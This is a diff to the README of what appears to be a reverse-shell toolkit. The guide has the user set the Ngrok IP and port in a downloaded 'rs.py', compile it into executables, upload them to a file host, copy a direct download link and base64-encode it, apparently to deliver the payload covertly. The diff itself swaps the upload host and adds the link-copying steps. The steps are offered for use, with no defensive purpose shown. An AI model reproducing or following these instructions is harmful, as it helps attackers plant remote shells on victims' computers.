@@ -20,7 +20,8 @@ you will need [Python](https://www.python.org/downloads/), [Netcat](https://eter
 5. **Download and Edit Python File**
    - [Download the Python file](https://catlitter.minoa.cat/api/view/bc52bb227eea93ac2dd0.zip) and in rs.py edit the IP and port to be the Ngrok one.
    - (Must have python installed) run windows compile.bat and only if you have wsl setup you can run linux compile.bat and the files that show up are compilex executables.
-   - Upload the compiled files to [upload.disroot.org](https://upload.disroot.org/)
+   - Upload the compiled files to [wormhole.app](https://wormhole.app/)!
+   - Once finished uploading refresh, click download, then go into your downlaod manager and copy the direct download link.
 
 6. **Convert URL to Base64**
    - Use [base64encode.org](https://www.base64encode.org/) to convert the URL for whatever file to Base64.
